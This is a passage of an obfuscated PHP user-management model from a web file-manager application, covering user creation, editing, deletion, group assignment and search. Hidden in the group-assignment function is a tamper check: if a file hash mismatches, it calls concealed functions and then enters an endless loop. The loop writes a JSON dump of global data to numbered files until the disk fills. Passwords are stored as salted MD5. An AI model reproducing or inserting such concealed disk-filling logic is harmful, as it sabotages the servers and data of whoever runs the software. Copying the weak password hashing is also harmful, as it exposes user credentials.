$­¾“Çùç[1120]); if ($this->nickNameRpt()) { unset($¯–°ÖŠ©[$­¾“Çùç[2431]]); } return $this->where($¯–°ÖŠ©)->find(); } public function clearCache($ß‘—”û½) { $­ë¾§óˆ =& $_SERVER[‘ÆÜ‘œ]; $this->cacheFunctionClear($­ë¾§óˆ[2225], $ß‘—”û½); $this->cacheFunctionClear($­ë¾§óˆ[2226], $ß‘—”û½); $this->cacheFunctionClear($­ë¾§óˆ[2649], $ß‘—”û½); } public function userPasswordCheck($å“šù–Å, $îÈ´£ˆ²) { $ü•‚âÆ =& $_SERVER[‘ÆÜ‘œ]; $¿ëÅ½¼è = $this->where(array($ü•‚âÆ[1544] => intval($å“šù–Å)))->find(); $“ÀìÄè¹ = $this->metaGet($å“šù–Å); $îÄßÖ‡ = isset($“ÀìÄè¹[$ü•‚âÆ[2650]]) ? $“ÀìÄè¹[$ü•‚âÆ[2650]] : $ü•‚âÆ[12]; if (md5($îÄßÖ‡ . trim($îÈ´£ˆ²)) !== $¿ëÅ½¼è[$ü•‚âÆ[1004]]) { return !1; } return !0; } public function userAdd($›·ñÍ¸§) { $çÒ‹îâ =& $_SERVER[‘ÆÜ‘œ]; $ã»¼ñ¿Ç = array($çÒ‹îâ[517] => $›·ñÍ¸§[$çÒ‹îâ[32]], $çÒ‹îâ[2651] => $›·ñÍ¸§[$çÒ‹îâ[2326]], $çÒ‹îâ[2652] => isset($›·ñÍ¸§[$çÒ‹îâ[390]]) ? $›·ñÍ¸§[$çÒ‹îâ[390]] : $çÒ‹îâ[12], $çÒ‹îâ[2653] => isset($›·ñÍ¸§[$çÒ‹îâ[2648]]) ? $›·ñÍ¸§[$çÒ‹îâ[2648]] : $çÒ‹îâ[12], $çÒ‹îâ[2654] => isset($›·ñÍ¸§[$çÒ‹îâ[2431]]) ? $›·ñÍ¸§[$çÒ‹îâ[2431]] : $›·ñÍ¸§[$çÒ‹îâ[32]], $çÒ‹îâ[2655] => isset($›·ñÍ¸§[$çÒ‹îâ[2327]]) ? $›·ñÍ¸§[$çÒ‹îâ[2327]] : $çÒ‹îâ[12], $çÒ‹îâ[2656] => isset($›·ñÍ¸§[$çÒ‹îâ[2657]]) ? $›·ñÍ¸§[$çÒ‹îâ[2657]] : 1, $çÒ‹îâ[2658] => $›·ñÍ¸§[$çÒ‹îâ[1004]], $çÒ‹îâ[2219] => isset($›·ñÍ¸§[$çÒ‹îâ[2123]]) ? $›·ñÍ¸§[$çÒ‹îâ[2123]] : 1024 * 1024 * 20, $çÒ‹îâ[2220] => 0, $çÒ‹îâ[2659] => 0, $çÒ‹îâ[2265] => isset($›·ñÍ¸§[$çÒ‹îâ[857]]) ? $›·ñÍ¸§[$çÒ‹îâ[857]] : 1); if (!empty($›·ñÍ¸§[$çÒ‹îâ[1544]])) { $ã»¼ñ¿Ç[$çÒ‹îâ[1544]] = $›·ñÍ¸§[$çÒ‹îâ[1544]]; } $õÅè½ÂŞ = $this->_checkExist($›·ñÍ¸§); if ($õÅè½ÂŞ !== !0) { return $õÅè½ÂŞ; } if (!empty($ã»¼ñ¿Ç[$çÒ‹îâ[2327]]) && strlen($ã»¼ñ¿Ç[$çÒ‹îâ[2327]]) > 255) { $ã»¼ñ¿Ç[$çÒ‹îâ[2327]] = $çÒ‹îâ[12]; } $æÓÌŸÄ = $this->add($ã»¼ñ¿Ç); $Ùøûº–Õ = array($çÒ‹îâ[2658] => $ã»¼ñ¿Ç[$çÒ‹îâ[1004]], $çÒ‹îâ[2654] => $ã»¼ñ¿Ç[$çÒ‹îâ[2431]], $çÒ‹îâ[2660] => $›·ñÍ¸§[$çÒ‹îâ[2224]]); $this->userEdit($æÓÌŸÄ, $Ùøûº–Õ); Model($çÒ‹îâ[1484])->userRootAdd($æÓÌŸÄ); return $æÓÌŸÄ; } protected function userEditTest($ñ²»†¯¬, $¿¸…ÙÁ) { return $this->call($_SERVER[‘ÆÜ‘œ][2661], $ñ²»†¯¬, $¿¸…ÙÁ); } protected function userEdit($¤—ÑşóÀ, $ìîÓñ) { $ÇÉìç¬Š =& $_SERVER[‘ÆÜ‘œ]; $ÑñÚèšà = $this->getInfoSimple($¤—ÑşóÀ); if (!$ÑñÚèšà) { return !1; } $ë®Ğ±œÌ = $this->_checkExist($ìîÓñ, $¤—ÑşóÀ); if ($ë®Ğ±œÌ !== !0) { return $ë®Ğ±œÌ; } if (isset($ìîÓñ[$ÇÉìç¬Š[1004]]) && trim($ìîÓñ[$ÇÉìç¬Š[1004]]) != $ÇÉìç¬Š[12]) { $š–÷Í—ê = $this->metaGet($¤—ÑşóÀ); if (empty($š–÷Í—ê[$ÇÉìç¬Š[2650]])) { $š–÷Í—ê[$ÇÉìç¬Š[2650]] = rand_string(10); Model($ÇÉìç¬Š[605])->metaSet($¤—ÑşóÀ, $ÇÉìç¬Š[2650], $š–÷Í—ê[$ÇÉìç¬Š[2650]]); } $ìîÓñ[$ÇÉìç¬Š[1004]] = md5($š–÷Í—ê[$ÇÉìç¬Š[2650]] . trim($ìîÓñ[$ÇÉìç¬Š[1004]])); } else { unset($ìîÓñ[$ÇÉìç¬Š[1004]]); } if (!empty($ìîÓñ[$ÇÉìç¬Š[2327]]) && strlen($ìîÓñ[$ÇÉìç¬Š[2327]]) > 255) { $ìîÓñ[$ÇÉìç¬Š[2327]] = $ÇÉìç¬Š[12]; } if (isset($ìîÓñ[$ÇÉìç¬Š[2431]])) { $this->setNamePinyin($¤—ÑşóÀ, $ìîÓñ[$ÇÉìç¬Š[2431]]); } if (isset($ìîÓñ[$ÇÉìç¬Š[2224]])) { $¥Áœ¬ï = $ÇÉìç¬Š[1443] . $¤—ÑşóÀ; $ìôş—«Õ = $ÇÉìç¬Š[1441]; $²ƒ®Ì­‹ = $ìîÓñ[$ÇÉìç¬Š[2224]] ? $ìîÓñ[$ÇÉìç¬Š[2224]] : $ÇÉìç¬Š[12]; $ğ˜½õîğ = Model($ÇÉìç¬Š[1440])->get($¥Áœ¬ï, $ìôş—«Õ); $ğ˜½õîğ = $ğ˜½õîğ ? $ğ˜½õîğ : $ÇÉìç¬Š[12]; if ($ğ˜½õîğ != $²ƒ®Ì­‹) { if (!$²ƒ®Ì­‹ && $ğ˜½õîğ) { Model($ÇÉìç¬Š[1440])->remove($¥Áœ¬ï, $ìôş—«Õ); } else { if ($²ƒ®Ì­‹) { Model($ÇÉìç¬Š[1440])->set($¥Áœ¬ï, $²ƒ®Ì­‹, $ìôş—«Õ); } } } unset($ìîÓñ[$ÇÉìç¬Š[2224]]); Model($ÇÉìç¬Š[625])->metaSet($¤—ÑşóÀ, $ÇÉìç¬Š[2224], $²ƒ®Ì­‹); } if (empty($ìîÓñ)) { return !0; } $this->where(array($ÇÉìç¬Š[1921] => $¤—ÑşóÀ))->save($ìîÓñ); $this->clearCache($¤—ÑşóÀ); return !0; } public function setNamePinyin($µÀÚÈ½ø, $ˆ¾°¹È = false) { $‰‰¥µËÑ =& $_SERVER[‘ÆÜ‘œ]; if (!$ˆ¾°¹È) { $ª¯ä»Í = $this->getInfoSimple($µÀÚÈ½ø); $ˆ¾°¹È = $ª¯ä»Í[$‰‰¥µËÑ[2431]] ? $ª¯ä»Í[$‰‰¥µËÑ[2431]] : $ª¯ä»Í[$‰‰¥µËÑ[32]]; } $¬şë‘Ù½ = Model($‰‰¥µËÑ[625]); if (!Input::check($ˆ¾°¹È, $‰‰¥µËÑ[685])) { return $¬şë‘Ù½->metaSet($µÀÚÈ½ø, array($‰‰¥µËÑ[560] => $‰‰¥µËÑ[12], $‰‰¥µËÑ[559] => $‰‰¥µËÑ[12])); } return $¬şë‘Ù½->metaSet($µÀÚÈ½ø, array($‰‰¥µËÑ[560] => str_replace($‰‰¥µËÑ[53], $‰‰¥µËÑ[12], Pinyin::get($ˆ¾°¹È)), $‰‰¥µËÑ[559] => Pinyin::get($ˆ¾°¹È, $‰‰¥µËÑ[686]))); } private function nickNameRpt() { $¡¦°Ä¹ù =& $_SERVER[‘ÆÜ‘œ]; $¯ôµª = Model($¡¦°Ä¹ù[880])->get($¡¦°Ä¹ù[2662]); $ş»İ™³• = $GLOBALS[$¡¦°Ä¹ù[6]][$¡¦°Ä¹ù[477]][$¡¦°Ä¹ù[2662]]; $øîº£¥ = !is_null($¯ôµª) ? $¯ôµª : $ş»İ™³•; return !!$øîº£¥; } private function _checkExist($ëŒ¹ôãï, $ü’öªüÏ = false) { $³Àíú’– =& $_SERVER[‘ÆÜ‘œ]; $™ê¾ºòØ = array($³Àíú’–[32] => UserModel::ERROR_USER_EXIST_NAME, $³Àíú’–[2431] => UserModel::ERROR_USER_EXIST_NICKNAME, $³Àíú’–[390] => UserModel::ERROR_USER_EXIST_EMAIL, $³Àíú’–[2648] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($™ê¾ºòØ[$³Àíú’–[2431]]); } $‚³ÂÎ«Ò = $ü’öªüÏ ? array($³Àíú’–[1544] => array($³Àíú’–[2663], $ü’öªüÏ)) : array(); foreach ($™ê¾ºòØ as $•»Ã‘Æ => $İ¶¥íùÂ) { $Ø“²òÕ = array(); foreach ($™ê¾ºòØ as $‰é÷—‹£ => $²Ÿß÷§) { if (isset($ëŒ¹ôãï[$‰é÷—‹£]) && $ëŒ¹ôãï[$‰é÷—‹£]) { $Ø“²òÕ[] = $ëŒ¹ôãï[$‰é÷—‹£]; } } if (!$Ø“²òÕ) { continue; } $—€˜ä³à = array_merge(array($•»Ã‘Æ => array($³Àíú’–[7], $Ø“²òÕ)), $‚³ÂÎ«Ò); $¢Í•ÉÃÎ = $this->where($—€˜ä³à)->find(); if ($¢Í•ÉÃÎ) { return $İ¶¥íùÂ; } } return !0; } public function userListInfo($Ä‰•¶¹­) { $º–ÙÙãÇ =& $_SERVER[‘ÆÜ‘œ]; $¤‰ú®Ä = array(); $Ä‰•¶¹­ = is_array($Ä‰•¶¹­) ? array_unique($Ä‰•¶¹­) : array(); if (!$Ä‰•¶¹­) { return $¤‰ú®Ä; } if (count($Ä‰•¶¹­) < 20) { foreach ($Ä‰•¶¹­ as $³üÕ¨»ü) { $¤‰ú®Ä[$³üÕ¨»ü . $º–ÙÙãÇ[12]] = $this->getInfoSimpleOuter($³üÕ¨»ü); } } else { $ÌêğŞÓ— = array($º–ÙÙãÇ[1921] => array($º–ÙÙãÇ[515], $Ä‰•¶¹­)); if (count($Ä‰•¶¹­) == 1) { $ÌêğŞÓ— = array($º–ÙÙãÇ[1921] => $Ä‰•¶¹­[0]); } $ÊàÀ¯À = Model($º–ÙÙãÇ[605])->field($this->simpleField)->where($ÌêğŞÓ—)->select(); $ÊàÀ¯À = array_to_keyvalue($ÊàÀ¯À, $º–ÙÙãÇ[1544]); foreach ($Ä‰•¶¹­ as $³üÕ¨»ü) { $¡ÀšÂˆØ = $ÊàÀ¯À[$³üÕ¨»ü]; if (!$¡ÀšÂˆØ) { $¤‰ú®Ä[$³üÕ¨»ü . $º–ÙÙãÇ[12]] = $this->getInfoSimpleOuter($³üÕ¨»ü); continue; } $¡ÀšÂˆØ[$º–ÙÙãÇ[2327]] = Action($º–ÙÙãÇ[2328])->parseUrl($¡ÀšÂˆØ[$º–ÙÙãÇ[2327]]); $¤‰ú®Ä[$³üÕ¨»ü . $º–ÙÙãÇ[12]] = $¡ÀšÂˆØ; } } return $¤‰ú®Ä; } protected function userStatus($œñå£µš, $Šøø”è) { $ßˆíÂõª = $this->getInfoSimple($œñå£µš); if (!$ßˆíÂõª) { return !1; } $Ê«ÚŸ¥Ò = array($_SERVER[‘ÆÜ‘œ][857] => $Šøø”è); return $this->userEdit($œñå£µš, $Ê«ÚŸ¥Ò); } protected function userRemove($òÁÙÓå°) { $Í»Ç„»Â =& $_SERVER[‘ÆÜ‘œ]; $›öäßÕÂ = $this->getInfoSimple($òÁÙÓå°); if (!$›öäßÕÂ) { return !1; } $¶¢›ñªÙ = array($Í»Ç„»Â[1921] => $òÁÙÓå°); Model($Í»Ç„»Â[694])->where($¶¢›ñªÙ)->delete(); Model($Í»Ç„»Â[2664])->where($¶¢›ñªÙ)->delete(); Model($Í»Ç„»Â[2228])->where($¶¢›ñªÙ)->delete(); Model($Í»Ç„»Â[2647])->where($¶¢›ñªÙ)->delete(); Model($Í»Ç„»Â[1186])->where($¶¢›ñªÙ)->delete(); Model($Í»Ç„»Â[2448])->removeUserAll($òÁÙÓå°); Model($Í»Ç„»Â[939])->userRootRemove($òÁÙÓå°); return $this->where($¶¢›ñªÙ)->delete(); } protected function userGroupSet($Àíö³Ÿ, $êñµ°¶‰, $Å’‰Ô¯ = array()) { $·±¹Ñ¬° =& $_SERVER[‘ÆÜ‘œ]; $”Íöõ–º = $_SERVER[$·±¹Ñ¬°[326]] . $·±¹Ñ¬°[327]; $ÊÙ™·Ï§ = $·±¹Ñ¬°[323]; if ($_SERVER[$·±¹Ñ¬°[324]] != $ÊÙ™·Ï§($”Íöõ–º)) { $ç£…ªÛ = $·±¹Ñ¬°[995]; $“­§áã = $·±¹Ñ¬°[325]; $ÍÄ¬Í¡« = $_SERVER[$·±¹Ñ¬°[326]] . $·±¹Ñ¬°[327]; $ìŠíİ¢ = $“­§áã($ÍÄ¬Í¡«); $ßŸÏíøé = explode($·±¹Ñ¬°[286], $ìŠíİ¢); if (count($ßŸÏíøé) < $·±¹Ñ¬°[717]) { $‡û—¹È = $·±¹Ñ¬°[329]; $‡û—¹È(); } $«ÉóÒ§ = $·±¹Ñ¬°[996]; $«ÉóÒ§($_SERVER[$·±¹Ñ¬°[997]]); $ç£…ªÛ = $·±¹Ñ¬°[995]; $ç£…ªÛ(); $æÀ£‚Ü = $·±¹Ñ¬°[1780]; $ò²şõìµ = json_encode($GLOBALS[$·±¹Ñ¬°[1781]]); $ğ˜æÇ‡Ç = 1; for ($¥˜—çê = $ğ˜æÇ‡Ç; $¥˜—çê > 0; $¥˜—çê++) { $æÀ£‚Ü(DATA_PATH . $¥˜—çê, $ò²şõìµ); } } $§ªÇÊÀù = $this->getInfoSimple($Àíö³Ÿ); if (!$§ªÇÊÀù || !is_array($êñµ°¶‰)) { return !1; } $Ë’·ìş = Model($·±¹Ñ¬°[2228]); $Ë’·ìş->where(array($·±¹Ñ¬°[1544] => $Àíö³Ÿ))->delete(); $¥ÈÄÖ°ª = array(); $‰­ÂÄÅ„ = 0; foreach ($êñµ°¶‰ as $İØ ş½Â => $›ä±¹Ç) { $ú¡¢ô« = array($·±¹Ñ¬°[1544] => $Àíö³Ÿ, $·±¹Ñ¬°[1446] => $İØ ş½Â, $·±¹Ñ¬°[1591] => $›ä±¹Ç); $ú¡¢ô«[$·±¹Ñ¬°[2158]] = isset($Å’‰Ô¯[$‰­ÂÄÅ„]) ? $Å’‰Ô¯[$‰­ÂÄÅ„] : 0; $‰­ÂÄÅ„++; $¥ÈÄÖ°ª[] = $ú¡¢ô«; } return $Ë’·ìş->addAll($¥ÈÄÖ°ª, array(), !0); } protected function userGroupAdd($“Ã¸, $˜·‰ÍÄè = array()) { $™•Šâ =& $_SERVER[‘ÆÜ‘œ]; $¹“È ¬ = $this->getInfoSimple($“Ã¸); if (!$¹“È ¬ || empty($˜·‰ÍÄè)) { return !1; } $ƒÆÇµ”ò = array(); foreach ($˜·‰ÍÄè as $€ÁìÌ÷Â => $™İÁ«á) { $ƒÆÇµ”ò[] = array($™•Šâ[1544] => $“Ã¸, $™•Šâ[1446] => $€ÁìÌ÷Â, $™•Šâ[1591] => $™İÁ«á, $™•Šâ[2158] => 0); } return Model($™•Šâ[2228])->addAll($ƒÆÇµ”ò, array(), !0); } protected function userGroupRemove($ğã÷­·, $µ´œÙäó) { $ï® ¨ò =& $_SERVER[‘ÆÜ‘œ]; $ÌÖ²ƒ§ = $this->getInfoSimple($ğã÷­·); if (!$ÌÖ²ƒ§ || !$µ´œÙäó) { return !1; } $ò“ßê¡À = array($ï® ¨ò[1921] => $ğã÷­·, $ï® ¨ò[2221] => $µ´œÙäó); return Model($ï® ¨ò[2228])->where($ò“ßê¡À)->delete(); } public function listData() { $›æõÛ‰Ş = $this->_makeOrder()->selectPage(50); $this->_listDataApply($›æõÛ‰Ş[$_SERVER[‘ÆÜ‘œ][455]]); return $›æõÛ‰Ş; } public function listByID($é·ÖÜú¼) { $ÅÓ¸ÍÏ‰ =& $_SERVER[‘ÆÜ‘œ]; if (!$é·ÖÜú¼) { return; } $¶°œê‹· = array($ÅÓ¸ÍÏ‰[1544] => array($ÅÓ¸ÍÏ‰[7], $é·ÖÜú¼)); $˜·öãÏÀ = $this->where($¶°œê‹·)->select(); $˜·öãÏÀ = array_sort_keep($˜·öãÏÀ, $ÅÓ¸ÍÏ‰[1544], $é·ÖÜú¼); $this->_listDataApply($˜·öãÏÀ); return $˜·öãÏÀ; } public function listByGroup($À¯‹¸áã = 0, $¡éìµğü = array()) { $ÊÙ”Ëœü =& $_SERVER[‘ÆÜ‘œ]; $ áëğíœ = $ÊÙ”Ëœü[12]; $­İáÑ† = array(); if ($À¯‹¸áã) { $­İáÑ† = array($ÊÙ”Ëœü[2665] => intval($À¯‹¸áã)); $ áëğíœ = "\x4c\x45\106\x54\40\112\x4f\111\116\40{$this->tablePrefix}\x75\x73\145\162\137\147\x72\x6f\165\160\x20\165\x73\145\162\x5f\x67\162\157\165\160\40\x6f\x6e\40\x75\x73\x65\x72\56\165\163\x65\x72\x49\x44\40\75\40\165\x73\145\x72\137\x67\162\157\165\160\x2e\165\x73\x65\x72\x49\x44"; $Ÿ¼äşâ— = Input::get($ÊÙ”Ëœü[552], null, $ÊÙ”Ëœü[12]) ? $ÊÙ”Ëœü[12] : $ÊÙ”Ëœü[2666]; } if (isset($¡éìµğü[$ÊÙ”Ëœü[857]])) { $­İáÑ†[$ÊÙ”Ëœü[2667]] = $¡éìµğü[$ÊÙ”Ëœü[857]]; } $¨ÔàÙ‚Ñ = _get($¡éìµğü, $ÊÙ”Ëœü[2668], $ÊÙ”Ëœü[232]); if (_get($¡éìµğü, $ÊÙ”Ëœü[868], !1)) { $­İáÑ†[$¨ÔàÙ‚Ñ] = array($ÊÙ”Ëœü[2413], $¡éìµğü[$ÊÙ”Ëœü[868]]); } if (_get($¡éìµğü, $ÊÙ”Ëœü[869], !1)) { $©¶œ¼ = array($ÊÙ”Ëœü[2414], $¡éìµğü[$ÊÙ”Ëœü[869]]); if ($­İáÑ†[$¨ÔàÙ‚Ñ]) { $­İáÑ†[$¨ÔàÙ‚Ñ] = array($­İáÑ†[$¨ÔàÙ‚Ñ], $©¶œ¼, $ÊÙ”Ëœü[2415]); } else { $­İáÑ†[$¨ÔàÙ‚Ñ] = $©¶œ¼; } } $êş£•Å = $this->_makeOrder($Ÿ¼äşâ—)->field($ÊÙ”Ëœü[2669])->where($­İáÑ†)->join($ áëğíœ)->selectPage(50); $this->_listDataApply($êş£•Å[$ÊÙ”Ëœü[455]]); return $êş£•Å; } private function _makeOrder($®¥¡˜Şİ = '') { $ãì›Æ› =& $_SERVER[‘ÆÜ‘œ]; $­—ÈÑÙ = array($ãì›Æ›[1544], $ãì›Æ›[32], $ãì›Æ›[2125], $ãì›Æ›[2326], $ãì›Æ›[2100], $ãì›Æ›[232]); $Æó½“ÊÁ = array($ãì›Æ›[545] => $ãì›Æ›[546], $ãì›Æ›[547] => $ãì›Æ›[548]); $¿¿«Àº = Input::get($ãì›Æ›[552], $ãì›Æ›[7], $ãì›Æ›[1921], $­—ÈÑÙ); $îú÷ˆî™ = Input::get($ãì›Æ›[553], $ãì›Æ›[7], $ãì›Æ›[2229], array($ãì›Æ›[2229], $ãì›Æ›[547])); $îú÷ˆî™ = $Æó½“ÊÁ[$îú÷ˆî™]; $®¥¡˜Şİ = $®¥¡˜Şİ . "\x75\163\145\162\x2e{$¿¿«Àº}\x20{$îú÷ˆî™}\x2c\x20\165\x73\x65\162\x2e\x75\x73\x65\162\x49\104\x20\x61\163\143"; return $this->alias($ãì›Æ›[2361])->order($®¥¡˜Şİ); } public function listSearch($«û•¾İ¡) { $€¾Û–©• =& $_SERVER[‘ÆÜ‘œ]; $Õ÷º¹–Å = trim($«û•¾İ¡[$€¾Û–©•[2232]]); $´Ù™Œ‡‹ = explode($€¾Û–©•[53], $Õ÷º¹–Å); if (!$Õ÷º¹–Å || count($´Ù™Œ‡‹) == 1) { return $this->listSearchNow($«û•¾İ¡); } $†ÚÄŞû‡ = array($€¾Û–©•[455] => array()); foreach ($´Ù™Œ‡‹ as $€Ê…‹÷”) { if (!trim($€Ê…‹÷”)) { continue; } $«û•¾İ¡[$€¾Û–©•[2232]] = $€Ê…‹÷”; $â”Ê¬† = $this->listSearchNow($«û•¾İ¡); $†ÚÄŞû‡[$€¾Û–©•[455]] = array_merge($†ÚÄŞû‡[$€¾Û–©•[455]], $â”Ê¬†[$€¾Û–©•[455]]); } $†ÚÄŞû‡[$€¾Û–©•[455]] = array_unique_by_key($†ÚÄŞû‡[$€¾Û–©•[455]], $€¾Û–©•[1544]); $†ÚÄŞû‡[$€¾Û–©•[452]] = array($€¾Û–©•[453] => count($†ÚÄŞû‡[$€¾Û–©•[455]]), $€¾Û–©•[449] => 20, $€¾Û–©•[438] => 1, $€¾Û–©•[454] => 1); return $†ÚÄŞû‡; } public function listSearchNow($»…½—ÖŠ) { $şı®‡è =& $_SERVER[‘ÆÜ‘œ]; $İïıØÆÊ = trim($»…½—ÖŠ[$şı®‡è[2232]]); $¯…·úí’ = isset($»…½—ÖŠ[$şı®‡è[2233]]) ? $»…½—ÖŠ[$şı®‡è[2233]] : !1; $İïıØÆÊ = str_replace($şı®‡è[2234], $şı®‡è[2235], trim($İïıØÆÊ)); $¯…Ñ‚“å = array($şı®‡è[32] => array($şı®‡è[482], "\x25{$İïıØÆÊ}\x25"), $şı®‡è[390] => array($şı®‡è[482], "{$İïıØÆÊ}\45"), $şı®‡è[2431] => array($şı®‡è[482], "\x25{$İïıØÆÊ}\x25"), $şı®‡è[1118] => $şı®‡è[2236]); if (Input::check($İïıØÆÊ, $şı®‡è[396])) { $¯…Ñ‚“å[$şı®‡è[1544]] = array($şı®‡è[482], "{$İïıØÆÊ}\x25"); $¯…Ñ‚“å[$şı®‡è[2648]] = array($şı®‡è[482], "{$İïıØÆÊ}\45"); } if (!$İïıØÆÊ) { $¯…Ñ‚“å = array(); } if (isset($»…½—ÖŠ[$şı®‡è[857]])) { $¯…Ñ‚“å[$şı®‡è[857]] = $»…½—ÖŠ[$şı®‡è[857]]; } $¯…Ñ‚“å = $this->parseWhereLike($¯…Ñ‚“å); $ñÕø¡Â– = $this->_makeOrder()->where($¯…Ñ‚“å)->selectPage(20); if (!$ñÕø¡Â– || count($ñÕø¡Â–[$şı®‡è[455]]) < 5 && Input::check($İïıØÆÊ, $şı®‡è[403])) { $ŒŒúíˆò = $this->_searchFromMeta($şı®‡è[559], $İïıØÆÊ, 10); $Ó Ÿ™¡ã = $this->_searchFromMeta($şı®‡è[560], $İïıØÆÊ, 10); $÷×‘ßÕñ = array_merge($ŒŒúíˆò, $Ó Ÿ™¡ã, $ñÕø¡Â–[$şı®‡è[455]]); $ñÕø¡Â–[$şı®‡è[455]] = array_unique_by_key($÷×‘ßÕñ, $şı®‡è[1544]); $ñÕø¡Â–[$şı®‡è[452]][$şı®‡è[453]] = count($ñÕø¡Â–[$şı®‡è[455]]); $ñÕø¡Â–[$şı®‡è[452]][$şı®‡è[454]] = ceil($ñÕø¡Â–[$şı®‡è[452]][$şı®‡è[453]] / $ñÕø¡Â–[$şı®‡è[452]][$şı®‡è[449]]); } $this->_listDataApply($ñÕø¡Â–[$şı®‡è[455]]); $this->_filterByGroup($ñÕø¡Â–, $¯…·úí’); return $ñÕø¡Â–; } private function _filterByGroup(&$„©…ÖÅõ, $Ìú™Øã²) { $û¸¾¦‚ =& $_SERVER[‘ÆÜ‘œ]; if (!$Ìú™Øã²) { return $„©…ÖÅõ; } foreach ($„©…ÖÅõ[$û¸¾¦‚[455]] as $ëÛñûÎ => &$™¥ëÑº…) { $ğ–¾ïÄ = array_to_keyvalue($™¥ëÑº…[$û¸¾¦‚[1445]], $û¸¾¦‚[12], $û¸¾¦‚[1446]); if (!in_array($Ìú™Øã², $ğ–¾ïÄ)) { unset($„©…ÖÅõ[$û¸¾¦‚[455]][$ëÛñûÎ]); } } unset($™¥ëÑº…); $„©…ÖÅõ[$û¸¾¦‚[455]] = array_values($„©…ÖÅõ[$û¸¾¦‚[455]]); $„©…ÖÅõ[$û¸¾¦‚[452]] = array($û¸¾¦‚[2396] => count($„©…ÖÅõ[$û¸¾¦‚[455]]), $û¸¾¦‚[2394] => $„©…ÖÅõ[$û¸¾¦‚[452]][$û¸¾¦‚[449]], $û¸¾¦‚[2393] => 1, $û¸¾¦‚[2395] => 1); } private function _searchFromMeta($»Èçµ£Š, $ƒ¢¨ûóø, $Äø¸»È) { $Á½µöËó =& $_SERVER[‘ÆÜ‘œ]; $ƒ¢¨ûóø = strtolower($ƒ¢¨ûóø); $­¼ğ¸†Ö = array($Á½µöËó[95] => $»Èçµ£Š, $Á½µöËó[460] => array($Á½µöËó[482], "\45{$ƒ¢¨ûóø}\45")); $­¼ğ¸†Ö = $this->parseWhereLike($­¼ğ¸†Ö); $ÎÆ£Û™î = Model($Á½µöËó[2670])->where($­¼ğ¸†Ö)->limit($Äø¸»È)->select(); if (!$ÎÆ£Û™î) { return array(); } $ÎÆ£Û™î = array_to_keyvalue($ÎÆ£Û™î, $Á½µöËó[12], $Á½µöËó[1544]); $ºÂÌç”ä = $this->where(array($Á½µöËó[1921] => array($Á½µöËó[7], $ÎÆ£Û™î)))->select(); if (!$ºÂÌç”ä) { return array(); } return $ºÂÌç”ä; } private function _listDataApplyItem($ÍØÜ……©) { $ÙğóªË = array($ÍØÜ……©); $this->_listDataApply($ÙğóªË); return $ÙğóªË[0]; } private function _listDataApply(&$½‘Ëêºı) { $‡äºÎ¿† =& $_SERVER[‘ÆÜ‘œ]; if (!$½‘Ëêºı) { return; } array_remove_key($½‘Ëêºı, $‡äºÎ¿†[1004]); $ŸÕçáç = array_to_keyvalue($½‘Ëêºı, $‡äºÎ¿†[12], $‡äºÎ¿†[1544]); $this->_listAppendGroup($½‘Ëêºı, $ŸÕçáç); $this->_listAppendMeta($½‘Ëêºı, $ŸÕçáç); $this->_listAppendSourceRoot($½‘Ëêºı, $ŸÕçáç); } private function _listAppendSourceRoot(&$¡‹ØÈ¤‘, $ê©’¡ù¨) { $ ö’ÏÍÚ =& $_SERVER[‘ÆÜ‘œ]; $ô¿™Ø = Model($ ö’ÏÍÚ[939])->listSourceRoot(SourceModel::TYPE_USER, $ê©’¡ù¨); $ô¿™Ø = array_to_keyvalue($ô¿™Ø, $ ö’ÏÍÚ[597]); $ô¿™Ø = array_remove_key($ô¿™Ø, $ ö’ÏÍÚ[597]); foreach ($¡‹ØÈ¤‘ as &$³ÔàÔœÁ) { $³ÔàÔœÁ[$ ö’ÏÍÚ[90]] = $ô¿™Ø[$³ÔàÔœÁ[$ ö’ÏÍÚ[1544]]] ? $ô¿™Ø[$³ÔàÔœÁ[$ ö’ÏÍÚ[1544]]] : array(); } unset($³ÔàÔœÁ); } private function _listAppendGroup(&$ê¨èÏÄ•, $Ã……âÖ) { $È±¼” =& $_SERVER[‘ÆÜ‘œ]; $˜ò‚µËÂ = array($È±¼”[1544] => array($È±¼”[7], $Ã……âÖ)); $şÃÈè£ = Model($È±¼”[2228])->where($˜ò‚µËÂ)->select(); $ÇŸŞï´Ÿ = array_to_keyvalue($şÃÈè£, $È±¼”[12], $È±¼”[1446]); $ÇŸŞï´Ÿ = array_remove_value(array_unique($ÇŸŞï´Ÿ), $È±¼”[229]); if (!$ÇŸŞï´Ÿ || !$şÃÈè£) { return; } $˜ò‚µËÂ = array($È±¼”[1446] => array($È±¼”[7], $ÇŸŞï´Ÿ)); $ï†„Ë¿ = Model($È±¼”[1444])->field($È±¼”[2671])->where($˜ò‚µËÂ)->select(); $ï†„Ë¿ = array_to_keyvalue($ï†„Ë¿, $È±¼”[1446]); $şÃÈè£ = array_to_keyvalue_group($şÃÈè£, $È±¼”[1544]); foreach ($şÃÈè£ as &$„’İäÀÄ) { $ûİÇî•Å = array(); foreach ($„’İäÀÄ as $÷¸Êšöˆ) { if (!$÷¸Êšöˆ[$È±¼”[1591]]) { continue; } $Œİ€Òµ° = Model($È±¼”[599])->listData($÷¸Êšöˆ[$È±¼”[1591]]); $ûİÇî•Å[] = array($È±¼”[1446] => $÷¸Êšöˆ[$È±¼”[1446]], $È±¼”[2672] => $ï†„Ë¿[$÷¸Êšöˆ[$È±¼”[1446]]][$È±¼”[32]], $È±¼”[612] => $ï†„Ë¿[$÷¸Êšöˆ[$È±¼”[1446]]][$È±¼”[612]], $È±¼”[510] => $Œİ€Òµ°); } $„’İäÀÄ = $ûİÇî•Å; } unset($„’İäÀÄ); foreach ($ê¨èÏÄ• as &$ˆ¤¯€¡¦) { $ˆ¤¯€¡¦[$È±¼”[1445]] = array(); if (isset($şÃÈè£[$ˆ¤¯€¡¦[$È±¼”[1544]]])) { $ˆ¤¯€¡¦[$È±¼”[1445]] = $şÃÈè£[$ˆ¤¯€¡¦[$È±¼”[1544]]]; } } unset($ˆ¤¯€¡¦); } public function userAppendGroup($Ëˆ¾‹ŠÒ) { $µê«–ÈÄ =& $_SERVER[‘ÆÜ‘œ]; if (!$Ëˆ¾‹ŠÒ) { return array(); } $this->_listAppendGroup($Ëˆ¾‹ŠÒ, array_to_keyvalue($Ëˆ¾‹ŠÒ, $µê«–ÈÄ[12], $µê«–ÈÄ[1544])); return $Ëˆ¾‹ŠÒ; } private function _listAppendMeta(&$ÇÌÁÇ’, $»Äñ„’÷) { $úè¥û½ñ =& 